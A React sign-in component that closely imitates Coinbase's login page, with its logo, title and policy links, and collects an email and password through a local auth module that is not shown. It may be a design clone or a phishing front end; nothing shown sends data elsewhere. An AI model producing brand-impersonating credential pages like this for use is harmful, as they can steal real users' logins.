import { useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { continueWithEmail, signInWithEmail } from '../api/auth'

export default function SignIn() {
  const navigate = useNavigate()
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [step, setStep] = useState('email')
  const [showCookieBanner, setShowCookieBanner] = useState(true)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [statusMessage, setStatusMessage] = useState('')

  const handleSubmit = async (event) => {
    event.preventDefault()

    if (!email.trim()) return

    setIsSubmitting(true)
    try {
      if (step === 'email') {
        const result = await continueWithEmail(email)
        setStatusMessage(result?.message || 'Email accepted. Enter your password to continue.')
        setStep('password')
      } else {
        const result = await signInWithEmail({ email, password })
        setStatusMessage(result?.message || 'Signed in successfully.')
        navigate('/')
      }
    } catch (error) {
      setStatusMessage(error?.message || 'Unable to sign in right now.')
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <main className="relative min-h-screen bg-[#0a0b0d] text-white">
      <header className="grid h-[72px] grid-cols-[auto_1fr_auto] px-6 md:px-8">
        <div className="flex items-center">
          <Link to="/" aria-label="Go to home" className="inline-flex items-center">
            <img
              src="https://th.bing.com/th/id/OIP.8zoJ7gePbR2l782-2jBkzQHaHa?w=200&h=200&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3"
              alt="Coinbase logo"
              className="h-8 w-8 rounded-full border border-slate-200 bg-white"
            />
          </Link>
        </div>
        <div />
        <div />
      </header>

      <section className="mx-auto flex w-full max-w-[448px] flex-col px-4 pb-36 pt-8 md:pt-10">
        <form onSubmit={handleSubmit} className="w-full">
          <h1 className="text-[28px] font-semibold leading-9">Sign in to Coinbase</h1>

          {step === 'email' ? (
            <div className="mt-6">
              <label htmlFor="signin-email" className="mb-2 block text-sm font-semibold text-white">
                Email
              </label>
              <input
                id="signin-email"
                type="email"
                autoComplete="username"
                aria-label="Email"
                value={email}
                onChange={(event) => setEmail(event.target.value)}
                placeholder="Your email address"
                className="h-14 w-full rounded-xl border border-[#8a919e] bg-[#0a0b0d] px-4 text-base text-white placeholder:text-[#8a919e] outline-none transition focus:border-[#3b82f6]"
              />
            </div>
          ) : (
            <>
              <div className="mt-6">
                <p className="mb-2 block text-sm font-semibold text-white">Email</p>
                <p className="h-14 w-full rounded-xl border border-[#8a919e] bg-[#0a0b0d] px-4 text-base leading-[56px] text-white">
                  {email}
                </p>
                <button
                  type="button"
                  onClick={() => {
                    setStep('email')
                    setPassword('')
                    setStatusMessage('')
                  }}
                  className="mt-2 text-xs font-semibold text-[#3b82f6] hover:underline"
                >
                  Use a different email
                </button>
              </div>

              <div className="mt-4">
                <label htmlFor="signin-password" className="mb-2 block text-sm font-semibold text-white">
                  Password
                </label>
                <input
                  id="signin-password"
                  type="password"
                  autoComplete="current-password"
                  aria-label="Password"
                  value={password}
                  onChange={(event) => setPassword(event.target.value)}
                  placeholder="Your password"
                  className="h-14 w-full rounded-xl border border-[#8a919e] bg-[#0a0b0d] px-4 text-base text-white placeholder:text-[#8a919e] outline-none transition focus:border-[#3b82f6]"
                />
              </div>
            </>
          )}

          <button
            type="submit"
            disabled={!email.trim() || (step === 'password' && !password.trim()) || isSubmitting}
            className="mt-6 h-14 w-full rounded-full bg-[#3b82f6] text-base font-semibold text-[#0a0b0d] transition hover:brightness-110 disabled:cursor-not-allowed disabled:bg-[#2563eb]"
          >
            {isSubmitting ? 'Submitting...' : step === 'email' ? 'Continue' : 'Sign in'}
          </button>

          {statusMessage ? <p className="mt-3 text-sm text-[#8a919e]">{statusMessage}</p> : null}
        </form>

        {step === 'email' ? (
          <div className="mt-8 w-full">
          <div className="relative flex items-center justify-center">
            <span className="absolute left-0 right-0 top-1/2 h-px -translate-y-1/2 bg-[#3f4652]" />
            <span className="relative z-10 bg-[#0a0b0d] px-4 text-xs font-semibold text-[#8a919e]">OR</span>
          </div>

          <div className="mt-4 flex flex-col gap-3">
            <button
              type="button"
              className="h-14 w-full rounded-full bg-[#32353d] px-5 text-sm font-semibold text-white transition hover:bg-[#3a3d45]"
            >
              Sign in with Passkey
            </button>

            <button
              type="button"
              className="h-14 w-full rounded-full bg-[#32353d] px-5 text-sm font-semibold text-white transition hover:bg-[#3a3d45]"
            >
              Sign in with Google
            </button>

            <button
              type="button"
              className="h-14 w-full rounded-full bg-[#32353d] px-5 text-sm font-semibold text-white transition hover:bg-[#3a3d45]"
            >
              Sign in with Apple
            </button>
          </div>
        </div>
        ) : null}

        <div className="mt-6 flex h-14 items-center justify-center text-base text-white">
          <span>Don&apos;t have an account? </span>
          <Link to="/signup" className="ml-1 font-semibold text-[#3b82f6] hover:underline">
            Sign up
          </Link>
        </div>

        <p className="text-center text-[13px] text-[#8a919e]">
          Not your device? Use a private window. See our{' '}
          <a
            href="https://coinbase.com/legal/privacy"
            target="_blank"
            rel="noopener noreferrer"
            className="underline hover:text-white"
          >
            Privacy Policy
          </a>{' '}
          for more info.
        </p>
      </section>

      {showCookieBanner ? (
        <div className="fixed bottom-0 left-0 right-0 z-10 bg-[#141519] px-4 py-4">
          <div className="mx-auto flex w-full max-w-[800px] flex-col items-start justify-between gap-4 md:flex-row md:items-center">
            <p className="text-sm text-white/90">
              We use strictly necessary cookies to enable essential functions, such as security and authentication. For
              more information, see our{' '}
              <a
                href="https://coinbase.com/legal/cookie"
                target="_blank"
                rel="noopener noreferrer"
                className="font-semibold text-[#3b82f6] hover:underline"
              >
                Cookie Policy
              </a>
              .
            </p>

            <button
              type="button"
              onClick={() => setShowCookieBanner(false)}
              className="h-10 rounded-full bg-[#3b82f6] px-6 text-sm font-semibold text-[#0a0b0d] transition hover:brightness-110"
            >
              Dismiss
            </button>
          </div>
        </div>
      ) : null}
    </main>
  )
}
